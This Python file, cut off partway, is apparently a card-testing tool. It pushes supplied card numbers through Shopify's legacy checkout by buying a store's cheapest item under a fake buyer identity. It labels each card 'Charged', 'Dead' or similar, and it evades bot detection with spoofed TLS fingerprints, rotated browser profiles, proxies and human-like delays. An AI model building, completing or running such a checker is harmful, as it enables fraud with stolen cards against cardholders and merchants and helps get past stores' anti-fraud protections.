# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# Shopify Checkout Core — LEGACY CHECKOUT FLOW
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# Converted FROM: New Checkout Flow (Storefront GraphQL + /checkouts/unstable/graphql)
# Converted TO:   Legacy Checkout Flow (multi-step HTML form POSTs)
#
# LEGACY FLOW:
#   1. GET  /products.json               -> cheapest physical product variant
#   2. POST /cart/add.js                 -> add to cart, absorb cookies
#   3. POST /cart                        -> init checkout, get checkout_token (302 redirect)
#   4. GET  /checkouts/{token}           -> parse authenticity_token, gateway_id
#   5. POST /checkouts/{token}           -> submit contact info + shipping address
#   6. GET  /checkouts/{token}/shipping_rates.json -> fetch shipping rates
#   7. GET  /checkouts/{token}?step=shipping_method -> parse fresh auth_token
#   8. POST /checkouts/{token}           -> select shipping method
#   9. GET  /checkouts/{token}?step=payment_method  -> parse gateway_id + auth_token
#  10. POST https://elb.deposit.shopifycs.com/sessions -> vault card, get session_id
#  11. POST /checkouts/{token}           -> submit payment (complete=1)
#  12. GET  /checkouts/{token}/processing -> poll until thank_you or decline
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

import json
import os
import re
import random
import sys
import time
from urllib.parse import urlparse, urljoin, urlencode, quote_plus

import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

# TLS fingerprinting - kept from original for anti-bot bypass
try:
    from tls_requests import Client as TLSClient, TLSIdentifierRotator
    _TLS_AVAILABLE = True
    _TLS_IDENTIFIER_POOL = [
        'chrome_131', 'chrome_133', 'chrome_124', 'chrome_120',
        'chrome_117', 'chrome_112',
    ]
    _tls_rotator = TLSIdentifierRotator(items=_TLS_IDENTIFIER_POOL, strategy='random')
    def _pick_tls_identifier():
        return _tls_rotator.next()
except ImportError:
    _TLS_AVAILABLE = False
    def _pick_tls_identifier():
        return 'chrome_120'

try:
    from curl_cffi import requests as curl_requests
    _CURL_CFFI_AVAILABLE = True
except ImportError:
    _CURL_CFFI_AVAILABLE = False

# =====================================================================
# BROWSER / CLIENT-HINTS POOL
# =====================================================================
_BROWSER_PROFILES = [
    {
        'ua': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36',
        'sec_ch_ua': '"Google Chrome";v="133", "Chromium";v="133", "Not/A)Brand";v="24"',
        'platform': '"Windows"',
    },
    {
        'ua': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
        'sec_ch_ua': '"Google Chrome";v="131", "Chromium";v="131", "Not/A)Brand";v="24"',
        'platform': '"Windows"',
    },
    {
        'ua': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
        'sec_ch_ua': '"Google Chrome";v="124", "Chromium";v="124", "Not_A Brand";v="8"',
        'platform': '"Windows"',
    },
    {
        'ua': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'sec_ch_ua': '"Google Chrome";v="120", "Chromium";v="120", "Not_A Brand";v="8"',
        'platform': '"Windows"',
    },
]

_PHONE_POOL = [
    '+12025551234', '+13105557890', '+16175553456', '+17185551122',
    '+14155559876', '+12125554321', '+13305552468', '+18135551357',
]

def _pick_phone():
    return random.choice(_PHONE_POOL)

def _pick_profile():
    p = dict(random.choice(_BROWSER_PROFILES))
    p['phone'] = _pick_phone()
    return p


# =====================================================================
# PROXY HELPERS
# =====================================================================
def parse_proxy(proxy_str):
    if not proxy_str:
        return None
    proxy_str = proxy_str.strip()
    if proxy_str.startswith(('http://', 'https://', 'socks5://', 'socks4://')):
        url = proxy_str
    elif '@' in proxy_str:
        url = 'http://' + proxy_str
    else:
        parts = proxy_str.split(':')
        if len(parts) == 4:
            host, port, user, pwd = parts
            url = f'http://{user}:{pwd}@{host}:{port}'
        elif len(parts) == 2:
            url = 'http://' + proxy_str
        else:
            url = proxy_str
    return {'http': url, 'https': url}


# =====================================================================
# SESSION FACTORY
# =====================================================================
def make_session(proxy_str=None, retries=3):
    proxy = None
    if proxy_str:
        _p = parse_proxy(proxy_str)
        if _p:
            proxy = _p.get('https') or _p.get('http')
    if _TLS_AVAILABLE:
        identifier = _pick_tls_identifier()
        session = TLSClient(
            client_identifier=identifier,
            http2=True,
            verify=True,
            timeout=30,
            follow_redirects=False,
            proxy=proxy,
        )
        return session
    if _CURL_CFFI_AVAILABLE:
        proxies = {'https': proxy, 'http': proxy} if proxy else {}
        session = curl_requests.Session(impersonate='chrome124', proxies=proxies)
        return session
    session = requests.Session()
    retry = Retry(total=retries, backoff_factor=0.5,
        status_forcelist=[429, 500, 502, 503, 504],
        allowed_methods=['GET', 'POST'], raise_on_status=False)
    adapter = HTTPAdapter(max_retries=retry)
    session.mount('http://', adapter)
    session.mount('https://', adapter)
    if proxy_str:
        proxies = parse_proxy(proxy_str)
        if proxies:
            session.proxies.update(proxies)
    return session


# =====================================================================
# DELAY UTILITIES
# =====================================================================
DELAY_SCALE = float(os.environ.get('DELAY_SCALE', '0.25'))

def human_delay(min_sec=0.8, max_sec=2.5):
    if DELAY_SCALE <= 0:
        return
    scaled_min = min_sec * DELAY_SCALE
    scaled_max = max_sec * DELAY_SCALE
    delay = random.triangular(scaled_min, scaled_max, (scaled_min + scaled_max) / 2.5)
    if random.random() < 0.05:
        delay += random.uniform(0.3, 1.0) * DELAY_SCALE
    time.sleep(delay)

def retry_on_429(fn, step_name="request", max_retries=3, base_delay=3.0, max_delay=15.0):
    for attempt in range(max_retries + 1):
        response = fn()
        if response.status_code != 429:
            return response
        if attempt == max_retries:
            return response
        backoff = min(base_delay * (2 ** attempt), max_delay)
        delay = backoff * random.uniform(0.5, 1.5)
        print(f"[rate-limit] {step_name} HTTP 429, retry {attempt+1}/{max_retries} in {delay:.1f}s", file=sys.stderr)
        time.sleep(delay)
    return response


# =====================================================================
# CC / CARD PARSING
# =====================================================================
def parse_cc_string(cc_string):
    if not cc_string:
        raise ValueError("Empty card string")
    cc_string = cc_string.strip()
    separators = ['|', '/', ':', ' ']
    parts = None
    for sep in separators:
        split = cc_string.split(sep)
        if len(split) == 4:
            parts = split
            break
    if not parts or len(parts) != 4:
        raise ValueError(f"Invalid card format: {cc_string}")
    number, month, year, cvv = [p.strip() for p in parts]
    if not number.isdigit():
        raise ValueError(f"Invalid card number: {number}")
    if len(year) == 2:
        year = '20' + year
    return number, month, year, cvv


def extract_clean_response(message):
    if not message:
        return 'UNKNOWN'
    clean_map = {
        'ORDER_PLACED': 'Charged',
        'CARD_DECLINED': 'Dead',
        'INSUFFICIENT_FUNDS': 'Insufficient Funds',
        '3DS_REQUIRED': '3DS Required',
        'OTP_REQUIRED': 'OTP Required',
        'CAPTCHA_BLOCK': 'Captcha Block',
        'CAPTCHA_REQUIRED': 'Captcha Required',
        'RATE_LIMITED': 'Rate Limited',
        'TOO_MANY_ATTEMPTS': 'Too Many Attempts',
    }
    return clean_map.get(message, message)


# =====================================================================
# HTML EXTRACTION HELPERS
# =====================================================================
def extract_authenticity_token(html):
    """Extract CSRF authenticity_token. Handles both legacy HTML forms and
    new Shopify checkout-web serialized meta tags (&quot; encoded JSON)."""
    if not html:
        return ''
    import html as _html_mod

    # Pattern 1: Legacy hidden input (classic checkout.liquid)
    patterns = [
        r'<input[^>]+name=["\']authenticity_token["\'][^>]+value=["\']([^"\']+)["\']',
        r'<input[^>]+value=["\']([^"\']+)["\'][^>]+name=["\']authenticity_token["\']',
        r'name="authenticity_token"\s+value="([^"]+)"',
        r"name='authenticity_token'\s+value='([^']+)'",
        r'"authenticity_token","([^"]+)"',
        r'authenticity_token["\s:=]+["\']([A-Za-z0-9+/=_\-]{20,})["\']',
        r'<meta[^>]+name=["\']csrf-token["\'][^>]+content=["\']([^"\']+)["\']',
        r'<meta[^>]+content=["\']([^"\']+)["\'][^>]+name=["\']csrf-token["\']',
    ]
    for pattern in patterns:
        m = re.search(pattern, html, re.IGNORECASE)
        if m:
            token = m.group(1).strip()
            if len(token) > 10:
                return token

    # Pattern 2: New checkout-web serialized meta (HTML-entity encoded JSON)
    serialized_patterns = [
        r'name="serialized-authenticity_token"[^>]+content="([^"]+)"',
        r'&quot;authenticityToken&quot;:&quot;([^&]+)&quot;',
        r'&quot;authenticity_token&quot;:&quot;([^&]+)&quot;',
    ]
    for pat in serialized_patterns:
        m = re.search(pat, html, re.IGNORECASE)
        if m:
            raw = _html_mod.unescape(m.group(1)).strip('"')
            if len(raw) > 10:
                return raw

    return ''

def extract_gateway_id(html):
    if not html:
        return ''
    patterns = [
        r'data-select-gateway=["\'](\d+)["\']',
        r'data-brand-icons-for-gateway=["\'](\d+)["\']',
        r'<input[^>]+name=["\']checkout\[payment_gateway\]["\'][^>]+value=["\'](\d+)["\']',
        r'<input[^>]+value=["\'](\d+)["\'][^>]+name=["\']checkout\[payment_gateway\]["\']',
        r'data-gateway-id=["\'](\d+)["\']',
        r'"id"\s*:\s*(\d{6,})\s*,\s*"method_title"\s*:\s*"Credit',
        r'payment_gateway["\s:=]+(\d{6,})',
        r'"paymentGatewayId"\s*:\s*"?(\d+)"?',
        r'data-gateway=["\'](\d+)["\']',
    ]
    for pattern in patterns:
        m = re.search(pattern, html, re.IGNORECASE)
        if m:
            gid = m.group(1).strip()
            if gid.isdigit() and len(gid) >= 5:
                return gid
    return ''


def extract_checkout_token_from_url(url):
    if not url:
        return ''
    m = re.search(r'/checkouts(?:/cn)?/([a-f0-9]{32})', url)
    if m:
        return m.group(1)
    m = re.search(r'/checkouts/([a-zA-Z0-9]{20,})', url)
    if m:
        return m.group(1)
    return ''


def extract_total_price(html):
    if not html:
        return '0.00', 'USD'
    patterns_price = [
        r'"total_price"\s*:\s*"?([0-9.]+)"?',
        r'data-checkout-payment-due-target=["\']([0-9]+)["\']',
        r'"paymentDue"\s*:\s*"?([0-9.]+)"?',
        r'total[_\-]?price["\s:=]+["\']?([0-9.]+)',
    ]
    patterns_currency = [
        r'"currency"\s*:\s*"([A-Z]{3})"',
        r'data-currency=["\']([A-Z]{3})["\']',
        r'"currencyCode"\s*:\s*"([A-Z]{3})"',
    ]
    price = '0.00'
    currency = 'USD'
    for p in patterns_price:
        m = re.search(p, html, re.IGNORECASE)
        if m:
            raw = m.group(1).replace(',', '')
            try:
                val = float(raw)
                if val > 1000:
                    val = val / 100
                price = f'{val:.2f}'
            except ValueError:
                pass
            break
    for p in patterns_currency:
        m = re.search(p, html, re.IGNORECASE)
        if m:
            currency = m.group(1).strip()
            break
    return price, currency


# =====================================================================
# STEP 1: PRODUCT FETCHER
# =====================================================================
def fetch_products(ourl, session, profile):
    headers = {
        'User-Agent': profile['ua'],
        'Accept': 'application/json',
        'sec-ch-ua': profile['sec_ch_ua'],
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': profile['platform'],
        'Referer': ourl + '/',
    }
    best_price = None
    best_variant_id = None
    best_product_id = None
    best_title = 'Product'
    best_requires_shipping = True

    for page in range(1, 4):
        try:
            resp = retry_on_429(
                lambda p=page: session.get(
                    f'{ourl}/products.json',
                    params={'limit': 250, 'sort_by': 'price-ascending', 'page': p},
                    headers=headers,
                    timeout=15,
                    allow_redirects=True,
                ),
                step_name=f"products_page{page}",
            )
        except Exception as e:
            print(f'[STEP1] products page {page} error: {e}', file=sys.stderr)
            break
        if resp.status_code == 404:
            break
        if resp.status_code != 200:
            continue
        try:
            data = resp.json()
        except Exception:
            break
        products = data.get('products', [])
        if not products:
            break
        for product in products:
            product_id = str(product.get('id', ''))
            for variant in product.get('variants', []):
                available = variant.get('available', True)
                if available is False:
                    continue
                try:
                    price = float(variant.get('price', 0))
                except (ValueError, TypeError):
                    continue
                if price <= 0:
                    continue
                variant_id = str(variant.get('id', ''))
                if not variant_id:
                    continue
                if best_price is None or price < best_price:
                    best_price = price
                    best_variant_id = variant_id
                    best_product_id = product_id
                    best_title = variant.get('title') or product.get('title') or 'Product'
                    best_requires_shipping = variant.get('requires_shipping', True)

    if not best_variant_id:
        raise RuntimeError("No purchasable variants found on /products.json")
    return best_variant_id, best_product_id, best_price, 'USD', best_requires_shipping, best_title


# =====================================================================
# CARD VAULTING — Legacy elb.deposit.shopifycs.com
# =====================================================================
def tokenize_card_legacy(cc, month, year, cvv, session, profile):
    vault_endpoints = [
        'https://elb.deposit.shopifycs.com/sessions',
        'https://deposit.us.shopifypay.com/sessions',
    ]
    payload = {
        'credit_card': {
            'number': cc,
            'month': int(month),
            'year': int(year),
            'verification_value': cvv,
            'name': 'John Doe',
        }
    }
    headers = {
        'User-Agent': profile['ua'],
        'Accept': 'application/json',
        'Content-Type': 'application/json',
        'Origin': 'https://checkout.shopify.com',
        'Referer': 'https://checkout.shopify.com/',
        'sec-ch-ua': profile['sec_ch_ua'],
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': profile['platform'],
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
    }
    last_error = None
    for vault_url in vault_endpoints:
        try:
            resp = retry_on_429(
                lambda u=vault_url: session.post(
                    u, headers=headers, json=payload, timeout=15,
                    allow_redirects=True,
                ),
                step_name="legacy_vault",
            )
            if resp.status_code not in (200, 201):
                last_error = f"Vault HTTP {resp.status_code}: {resp.text[:200]}"
                continue
            try:
                data = resp.json()
            except Exception:
                last_error = f"Vault non-JSON: {resp.text[:200]}"
                continue
            token = data.get('id') or data.get('token') or data.get('session_id')
            if not token:
                last_error = f"Vault returned no token: {data}"
                continue
            return str(token)
        except Exception as e:
            last_error = str(e)
            continue
    raise RuntimeError(f"Card vault failed: {last_error}")


# =====================================================================
# LEGACY ERROR MESSAGE EXTRACTOR
# =====================================================================
def _extract_legacy_error(html):
    if not html:
        return ''
    patterns = [
        r'<p[^>]+class=["\'][^"\']*notice--error[^"\']*["\'][^>]*>\s*([^<]{5,200})',
        r'<div[^>]+class=["\'][^"\']*notice__content[^"\']*["\'][^>]*>\s*([^<]{5,200})',
        r'class=["\'][^"\']*field__message--error[^"\']*["\'][^>]*>\s*([^<]{5,200})',
        r'<span[^>]+class=["\'][^"\']*error[^"\']*["\'][^>]*>\s*([^<]{5,200})',
        r'data-error=["\']([^"\']{5,200})["\']',
        r'"error_message"\s*:\s*"([^"]{5,200})"',
        r'"message"\s*:\s*"([^"]{5,200})"',
    ]
    for pattern in patterns:
        m = re.search(pattern, html, re.IGNORECASE | re.DOTALL)
        if m:
            msg = re.sub(r'\s+', ' ', m.group(1)).strip()
            msg = re.sub(r'<[^>]+>', '', msg).strip()
            if 5 < len(msg) < 300:
                return msg
    html_lower = html.lower()
    if 'insufficient' in html_lower:
        return 'INSUFFICIENT_FUNDS'
    if 'expired' in html_lower and 'card' in html_lower:
        return 'CARD_EXPIRED'
    if 'invalid' in html_lower and ('card' in html_lower or 'number' in html_lower):
        return 'INVALID_CARD'
    if 'do not honor' in html_lower:
        return 'DO_NOT_HONOR'
    if 'security code' in html_lower or 'cvv' in html_lower:
        return 'INVALID_CVV'
    if 'billing' in html_lower and 'address' in html_lower:
        return 'BILLING_ADDRESS_MISMATCH'
    if 'declined' in html_lower:
        return 'CARD_DECLINED'
    return 'CARD_DECLINED'


# =====================================================================
# STEP 12 HELPER: Poll processing page
# =====================================================================
def _poll_processing(processing_url, checkout_url, ourl, session, profile,
                      _cookies, gateway, total_price, currency, max_polls=12):
    def bh(referer=''):
        return {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'User-Agent': profile['ua'],
            'sec-ch-ua': profile['sec_ch_ua'],
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': profile['platform'],
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            **({'Referer': referer} if referer else {}),
        }

    current_url = processing_url
    last_html = ''

    for poll_i in range(max_polls):
        try:
            poll_resp = retry_on_429(
                lambda u=current_url: session.get(
                    u, headers=bh(referer=checkout_url),
                    timeout=20, allow_redirects=False, cookies=_cookies,
                ),
                step_name=f"poll_{poll_i}",
            )
        except Exception as e:
            print(f'[POLL] attempt {poll_i+1} error: {e}', file=sys.stderr)
            time.sleep(2)
            continue

        for k, v in poll_resp.cookies.items():
            if v:
                _cookies[k] = v

        sc = poll_resp.status_code
        print(f'[POLL] attempt {poll_i+1} status={sc}', file=sys.stderr)

        if sc in (301, 302, 303):
            loc = poll_resp.headers.get('Location', '')
            if not loc:
                break
            if not loc.startswith('http'):
                loc = urljoin(ourl, loc)

            if 'thank_you' in loc or 'thank-you' in loc or '/orders/' in loc:
                return True, 'ORDER_PLACED', gateway, total_price, currency

            if 'step=payment_method' in loc or 'payment_method' in loc:
                try:
                    err_resp = session.get(loc, headers=bh(), timeout=15,
                                           allow_redirects=True, cookies=_cookies)
                    err_msg = _extract_legacy_error(err_resp.text)
                    return False, err_msg or 'CARD_DECLINED', gateway, total_price, currency
                except Exception:
                    return False, 'CARD_DECLINED', gateway, total_price, currency

            if 'three_d_secure' in loc or '3d_secure' in loc or 'action_required' in loc:
                return True, '3DS_REQUIRED', gateway, total_price, currency

            current_url = loc
            time.sleep(1.5)
            continue

        elif sc == 200:
            html_body = poll_resp.text
            last_html = html_body

            # Strict check: thank_you must be in URL path or visible HTML text, NOT in JS/CDN URLs
            _is_confirmed = (
                '/thank_you' in html_body.split('"')[0][:200]  # in page URL shown in meta/og tags
                or re.search(r'<title>[^<]*(?:thank you|order confirmed)[^<]*</title>', html_body, re.IGNORECASE)
                or re.search(r'<h[12][^>]*>[^<]*(?:thank you|order confirmed)[^<]*</h[12]>', html_body, re.IGNORECASE)
                or re.search(r'(?:^|["\'/])(?:.*?/)?thank_you(?:["\'/]|$)', html_body)
                or 'Your order is confirmed' in html_body
                or re.search(r'order[_-]?number["\s:]+[#\d]', html_body, re.IGNORECASE)
            )
            if _is_confirmed:
                return True, 'ORDER_PLACED', gateway, total_price, currency

            if any(k in html_body for k in ['Your card was declined', 'card_declined',
                                             'payment was declined', 'transaction was declined',
                                             'Your payment could not be processed']):
                return False, _extract_legacy_error(html_body) or 'CARD_DECLINED', gateway, total_price, currency

            if any(k in html_body for k in ['three_d_secure', '3d-secure', 'action_required',
                                             'ThreeDSecure']):
                return True, '3DS_REQUIRED', gateway, total_price, currency

            if any(k in html_body for k in ['one_time_password', 'otp_required']):
                return True, 'OTP_REQUIRED', gateway, total_price, currency

            if any(k in html_body.lower() for k in ['captcha', 'recaptcha', 'cf-challenge']):
                return False, 'CAPTCHA_REQUIRED', gateway, total_price, currency

            # Still processing
            m_refresh = re.search(r'content=["\'][0-9]+;URL=["\']?([^"\'> ]+)', html_body)
            if m_refresh:
                refresh_url = m_refresh.group(1).strip()
                if not refresh_url.startswith('http'):
                    refresh_url = urljoin(ourl, refresh_url)
                current_url = refresh_url

            print(f'[POLL] Still processing... attempt {poll_i+1}', file=sys.stderr)
            time.sleep(2)
            continue

        elif sc == 404:
            return False, 'CHECKOUT_NOT_FOUND', gateway, total_price, currency
        elif sc == 429:
            time.sleep(5)
            continue
        else:
            time.sleep(2)
            continue

    if last_html:
        if 'thank_you' in last_html or 'order_number' in last_html:
            return True, 'ORDER_PLACED', gateway, total_price, currency
        err = _extract_legacy_error(last_html)
        if err:
            return False, err, gateway, total_price, currency

    return False, 'POLL_TIMEOUT: Processing took too long', gateway, total_price, currency


# =====================================================================
# MAIN LEGACY CHECKOUT FLOW
# =====================================================================
def process_card(cc, month, year, cvv, site_url, variant_id_override=None, proxy_str=None):
    """
    Run the full LEGACY Shopify checkout flow for one card.
    Returns: (success: bool, message: str, gateway: str, price: str, currency: str)
    """
    profile = _pick_profile()
    session = make_session(proxy_str)
    ourl = site_url.rstrip('/')
    if not ourl.startswith('http'):
        ourl = 'https://' + ourl

    gateway = 'Shopify Payments'
    total_price = '0.00'
    currency = 'USD'

    firstName = 'John'
    lastName  = 'Doe'
    email     = f'test{random.randint(10000, 99999)}@gmail.com'
    street    = '1600 Pennsylvania Ave NW'
    city      = 'Washington'
    country   = 'United States'
    state     = 'DC'
    s_zip     = '20500'
    phone     = profile.get('phone', '+12025551234')

    _cookies = {}

    def absorb_cookies(resp):
        if hasattr(resp, 'cookies'):
            for k, v in resp.cookies.items():
                if v:
                    _cookies[k] = v

    def bh_browse(referer=''):
        h = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'User-Agent': profile['ua'],
            'sec-ch-ua': profile['sec_ch_ua'],
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': profile['platform'],
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
        }
        if referer:
            h['Referer'] = referer
        return h

    def bh_ajax(referer=''):
        h = {
            'Accept': 'application/json, text/javascript, */*; q=0.01',
            'Accept-Language': 'en-US,en;q=0.9',
            'Content-Type': 'application/x-www-form-urlencoded',
            'User-Agent': profile['ua'],
            'X-Requested-With': 'XMLHttpRequest',
            'sec-ch-ua': profile['sec_ch_ua'],
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': profile['platform'],
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
        }
        if referer:
            h['Referer'] = referer
        return h

    try:
        # ============================================================
        # STEP 1: Fetch cheapest product variant
        # ============================================================
        if variant_id_override:
            variant_id = variant_id_override
            price = 1.0
            product_title = 'Product'
        else:
            variant_id, product_id, price, currency, requires_shipping, product_title = fetch_products(
                ourl, session, profile
            )
        print(f'[STEP1] variant_id={variant_id} price={price} title={product_title[:40]}', file=sys.stderr)
        human_delay(0.3, 0.8)

        # ============================================================
        # STEP 2: Add to cart via /cart/add.js
        # ============================================================
        # TLSClient requires JSON items[] format; plain requests accepts form-encoded too
        cart_add_headers = {
            'User-Agent': profile['ua'],
            'Accept': 'application/json, text/javascript, */*; q=0.01',
            'Content-Type': 'application/json',
            'X-Requested-With': 'XMLHttpRequest',
            'sec-ch-ua': profile['sec_ch_ua'],
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': profile['platform'],
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'Referer': ourl + '/',
        }

        cart_add_resp = retry_on_429(
            lambda: session.post(
                f'{ourl}/cart/add.js',
                headers=cart_add_headers,
                json={'items': [{'id': int(variant_id), 'quantity': 1}]},
                timeout=15,
                allow_redirects=True,
                cookies=_cookies,
            ),
            step_name="cart_add",
        )
        absorb_cookies(cart_add_resp)

        if cart_add_resp.status_code not in (200, 201):
            return False, f"CART_ADD_FAILED: HTTP {cart_add_resp.status_code}", gateway, total_price, currency

        try:
            cart_data = cart_add_resp.json()
            # items[] response - get price from first item
            items = cart_data.get('items', [])
            if items:
                raw_price = items[0].get('price', 0) or items[0].get('final_price', 0)
                if raw_price:
                    price = float(raw_price) / 100
                    total_price = f'{price:.2f}'
            elif cart_data.get('price'):
                price = float(cart_data['price']) / 100
                total_price = f'{price:.2f}'
        except Exception:
            pass

        print(f'[STEP2] Cart add OK — cookies={list(_cookies.keys())}', file=sys.stderr)
        human_delay(0.5, 1.0)

        # ============================================================
        # STEP 3: GET /checkout -> follow redirects -> get checkout_url
        # ============================================================
        # TLSClient follows all redirects (incl. shop.app) and lands on
        # the real checkout page. GET /checkout is more reliable than
        # POST /cart which TLSClient doesn't honour allow_redirects=False.
        init_headers = bh_browse(referer=f'{ourl}/cart')

        checkout_init_resp = retry_on_429(
            lambda: session.get(
                f'{ourl}/checkout',
                headers=init_headers,
                timeout=25,
                allow_redirects=True,
                cookies=_cookies,
            ),
            step_name="checkout_init",
        )
        absorb_cookies(checkout_init_resp)

        checkout_url = None
        _final_url = str(getattr(checkout_init_resp, 'url', ''))

        if checkout_init_resp.status_code in (301, 302, 303):
            location = checkout_init_resp.headers.get('Location', '')
            if not location.startswith('http'):
                location = urljoin(ourl, location)
            from urllib.parse import parse_qs as _parse_qs
            if 'shop.app' in location or 'ur_back_url=' in location:
                try:
                    _qs = _parse_qs(urlparse(location).query)
                    _back = _qs.get('ur_back_url', [''])[0]
                    checkout_url = _back if (_back and '/checkouts/' in _back) else location
                except Exception:
                    checkout_url = location
            else:
                checkout_url = location
        elif checkout_init_resp.status_code == 200:
            # TLSClient followed all redirects — check final URL
            if _final_url and '/checkouts/' in _final_url:
                # May have ur_back_url in query string if it landed on shop.app
                if 'ur_back_url=' in _final_url:
                    from urllib.parse import parse_qs as _parse_qs
                    _qs = _parse_qs(urlparse(_final_url).query)
                    _back = _qs.get('ur_back_url', [''])[0]
                    checkout_url = _back if (_back and '/checkouts/' in _back) else _final_url
                else:
                    checkout_url = _final_url
            else:
                # Parse from HTML
                m = re.search(r'action=["\'\']([^"\'\']*checkouts[^"\'\']*)["\'\']', checkout_init_resp.text)
                if m:
                    checkout_url = urljoin(ourl, m.group(1))

        if not checkout_url or '/checkouts/' not in checkout_url:
            return False, "CHECKOUT_INIT_FAILED: Could not obtain checkout URL", gateway, total_price, currency

        # Strip query params for the base checkout URL used in form POSTs
        checkout_url_base = checkout_url.split('?')[0]
        checkout_token = extract_checkout_token_from_url(checkout_url_base)
        print(f'[STEP3] checkout_url={checkout_url_base[:80]} token={checkout_token[:16] if checkout_token else "NONE"}', file=sys.stderr)
        human_delay(0.5, 1.2)

        # ============================================================
        # STEP 4: Parse authenticity_token from already-loaded checkout page
        # (checkout_init_resp from Step 3 already has the checkout HTML)
        # ============================================================
        # Reuse the checkout page we already loaded in Step 3
        if checkout_init_resp.status_code == 200:
            checkout_page_resp = checkout_init_resp
        else:
            # Fallback: fetch the checkout page explicitly
            checkout_page_resp = retry_on_429(
                lambda: session.get(
                    checkout_url_base,
                    headers=bh_browse(referer=f'{ourl}/cart'),
                    timeout=20,
                    allow_redirects=True,
                    cookies=_cookies,
                ),
                step_name="checkout_page",
            )
            absorb_cookies(checkout_page_resp)

        if checkout_page_resp.status_code not in (200,):
            return False, f"CHECKOUT_PAGE_FAILED: HTTP {checkout_page_resp.status_code}", gateway, total_price, currency

        checkout_html = checkout_page_resp.text

        # Update checkout_url_base from final URL if it changed
        _final_url2 = str(getattr(checkout_page_resp, 'url', checkout_url_base))
        if '/checkouts/' in _final_url2:
            _new_base = _final_url2.split('?')[0]
            if _new_base != checkout_url_base:
                checkout_url_base = _new_base
                _new_tok = extract_checkout_token_from_url(checkout_url_base)
                if _new_tok:
                    checkout_token = _new_tok

        authenticity_token = extract_authenticity_token(checkout_html)
        if not authenticity_token:
            # Don't fail yet — new checkout-web may not have this token
            # but we still attempt contact_info POST with empty token
            print('[STEP4] WARNING: No authenticity_token found (new checkout-web?)', file=sys.stderr)
            authenticity_token = ''

        _pp, _pc = extract_total_price(checkout_html)
        if float(_pp) > 0:
            total_price = _pp
            currency = _pc

        print(f'[STEP4] auth_token={authenticity_token[:20]}... price={total_price} {currency}', file=sys.stderr)
        human_delay(0.6, 1.5)

        # ============================================================
        # STEP 5: POST contact info + shipping address
        # ============================================================
        contact_payload = urlencode({
            '_method': 'patch',
            'authenticity_token': authenticity_token,
            'previous_step': 'contact_information',
            'step': 'shipping_method',
            'checkout[email]': email,
            'checkout[buyer_accepts_marketing]': '0',
            'checkout[shipping_address][first_name]': firstName,
            'checkout[shipping_address][last_name]': lastName,
            'checkout[shipping_address][address1]': street,
            'checkout[shipping_address][address2]': '',
            'checkout[shipping_address][city]': city,
            'checkout[shipping_address][country]': 'United States',
            'checkout[shipping_address][province]': state,
            'checkout[shipping_address][zip]': s_zip,
            'checkout[shipping_address][phone]': phone,
            'checkout[client_details][javascript_enabled]': '1',
            'checkout[client_details][browser_width]': '1280',
            'checkout[client_details][browser_height]': '800',
            'checkout[client_details][browser_tz]': '-300',
            'checkout[client_details][browser_color_depth]': '24',
            'button': '',
        })

        contact_headers = bh_browse(referer=checkout_url_base)
        contact_headers['Content-Type'] = 'application/x-www-form-urlencoded'
        contact_headers['Origin'] = ourl

        contact_resp = retry_on_429(
            lambda: session.post(
                checkout_url_base,
                headers=contact_headers,
                data=contact_payload,
                timeout=25,
                allow_redirects=False,
                cookies=_cookies,
            ),
            step_name="contact_info",
        )
        absorb_cookies(contact_resp)

        shipping_page_url = checkout_url_base + '?step=shipping_method'
        if contact_resp.status_code in (301, 302, 303):
            loc = contact_resp.headers.get('Location', '')
            if loc:
                if not loc.startswith('http'):
                    loc = urljoin(ourl, loc)
                shipping_page_url = loc

        print(f'[STEP5] Contact submitted status={contact_resp.status_code}', file=sys.stderr)
        human_delay(0.8, 1.8)

        # ============================================================
        # STEP 6: Fetch shipping rates
        # ============================================================
        shipping_rates_url = f'{checkout_url_base}/shipping_rates.json'
        shipping_rate_handle = None

        for _attempt in range(8):
            rates_resp = retry_on_429(
                lambda: session.get(
                    shipping_rates_url,
                    headers=bh_ajax(referer=shipping_page_url),
                    timeout=15,
                    allow_redirects=True,
                    cookies=_cookies,
                ),
                step_name="shipping_rates",
            )
            absorb_cookies(rates_resp)
            if rates_resp.status_code == 200:
                try:
                    rates_data = rates_resp.json()
                    shipping_rates = rates_data.get('shipping_rates', [])
                    if shipping_rates:
